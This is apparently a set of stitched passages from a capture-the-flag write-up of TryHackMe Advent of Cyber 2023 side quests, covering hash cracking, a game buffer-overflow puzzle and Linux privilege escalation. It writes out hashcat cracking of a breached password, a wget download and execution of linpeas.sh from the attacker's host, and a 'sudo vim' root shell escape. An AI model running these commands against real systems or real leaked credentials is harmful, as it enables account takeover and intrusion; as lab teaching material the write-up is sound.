Unfortunately, the provided site http://scylla.so/ was currently offline. So I had to find an alternative website. I searched through several of the below alternatives I could find:</p> <p></p> <p>Only https://breachdirectory.org/ seemed to work. Unfortunately, it only showed a partial password associated with the email. </p> <p></p> <p>Doing a quick search through the <code>rockyou</code> password list, we found several hits. We could just try all there, but that wouldn't be practical in other situations.</p> <p></p> <p>Luckily, it does show us the SHA1 hash of the password. This means we can use <code>hashcat</code> to possibly crack the password. We can do a normal hashcat search with the following command after saving the hashes to a file:</p> <p></p> <pre><code>hashcat -m 100 rudolphpass.txt /usr/share/wordlists/rockyou.txt\n</code></pre> <p>However, since we have a partial password, I wanted to try and make a bit more elegant solution. Completely unnecessary, since it would normally complete in a short time, but it was a fun way to learn more about the various commands used. Using the following commands we can pipe all entries from the <code>rockyou</code> list shich could be our password to a separate list (heck, lets try both passwords we found).</p> <pre><code>cat /usr/share/wordlists/rockyou.txt | grep \"^spyg...$\" &gt; rudolphpass.txt\n\ncat /usr/share/wordlists/rockyou.txt | grep \"^liv............$\" &gt;&gt; rudolphpass.txt\n</code></pre> <p>With some clever regexing we get a list with all possible passwords. Now we can run the following command with our custom word list and the saved hashes.</p> <pre><code>hashcat -m 100 rudolphpass.hash rudolphpass.txt\n</code></pre> <p></p> <p>Boom, we managed to find our password, unfortunately, the second one was not found.

Maybe we have to look at the stuff we can't buy/isn't listed. This can be done by changing our name to have our inventory contain all possible characters or we can try them in the shop.</p> <p>A is not listed which we would expect, the other correct IDs are E and F. These two are out of stock.</p> <p></p> <p>However, ID A tells us we dont' have enough money. Which is weird, since we have a lot.</p> <p></p> <p>Lets try to add these items manually using the name switcher.</p> <p></p> <p>Apparently A is some sort of yeti token, E is a blue nutcracker, and F is a TryHackMe ball.</p> <p></p> <p>A is of interest as we could have bought it with money. Checking the shopkeeper again, we are told we don't have the real one. Which we can indeed buy.</p> <p></p> <p>We need more money. The most money we can get is probably by using the last letter 'z' four times.</p> <p>Lets change our name so our coin count becomes 'zzzz'.</p> <p></p> <p>Lets see if we can buy the real token this time.</p> <p>Use ID A to buy the unlisted token.</p> <p></p> <p>Success!</p> <p>We also see a glitch appear. The Ghost of the Christmas Glitch!</p> <p>The glitch sees we have the real token and has a riddle for us.</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>Looks like there are 4 conditions we must meet.</p> <ul> <li>Our name must be: Snowball</li> <li>Our coins count must be 31337</li> <li>The shopkeeper must be named: MIDAS</li> <li>The name switcher must be named: TED</li> </ul> <p>We can't do all this at once, since we need a null character at the end of each variable.</p> <p>First we must get more coins to change our name. Then we name the name switcher 'Ted' using <code>My name here1234123412341234Ted</code>.</p> <p></p> <p>Then we do the same with the shopkeeper using <code>My name here1234Midas</code>.</p> <p></p> <p>We need 31337 coins. Lets convert this into hexadecimal and then to text (keep in mind the game is using little-endian notation).</p> <p></p> <p>However, we still need to change our own name afterwards, decreasing our coin count.</p> <p>So we must add and extra 8 coins, since 'Snowball' consists of 8 characters (31345).</p> <p></p> <p>This gives us a value of 'qz'.</p> <p>First change the last digit of the coin counter to a null value and then to 'qz'.</p> <pre><code>My name here123\nMy name hereqz\n</code></pre> <p></p> <p>Finally, we change our characters name to 'Snowball'.</p> <p></p> <p>All condition are met. Now we must input some secret code. I have no idea what it is, but we can look it up only.</p> <p></p> <p>It seems to be a cheat code for the game Contra.</p> <p>Back in the game we input the cheat code omitting 'start'.</p> <p>Everything starts to glitch out even more and we stumble upon the yeti who has a message for us.</p> <p></p> <p>To get our flag we must complete the room.</p> <p>Click for answer</p> <ol> <li>Side Quest Challenge 3 Flag </li> </ol> <p>Click for answer</p> <ol> <li>Side Quest Challenge 4 Flag </li> </ol> <p>Click for answer</p>"},{"location":"adventofcyber23sidequest/adventofcyber23sidequest/#the-key-you-get-this-one-for-free","title":"The Key You get this one for free!","text":"<ol> <li>How many QR code pieces was the Challenge 1 Key divided into?  </li> </ol> <p>We get the last piece of the first key in this task.

Started a server on our machine and transferring the script over. But that didn't work either.</p> <pre><code>python3 -m http.server 8080\nwget http://10.18.78.136:8080/linpeas.sh\n\nchmod x linpeas.sh\n./linpeas.sh\n</code></pre> <p>I looked at the kernel version with <code>uname -a</code> to find if it was vulnerable. Didn't give anything either.</p> <p>Finally, I looked at the executables we would be able to run with sudo.</p> <pre><code>sudo -l\n</code></pre> <p></p> <p>Looks like there might be a program that we can exploit with this.</p> <p>Click for answervim</p> <ol> <li>What's the root flag?</li> </ol> <p>Lets take a look at GTFObins to find out what we can do with vim. We know our user can run <code>vim</code> as sudo, so that is where we should look.</p> <p></p> <p>Now we input the command into our shell to get an elevated shell.</p> <pre><code>sudo vim -c ':!/bin/sh'\n</code></pre> <p></p> <p>Looks like this worked.
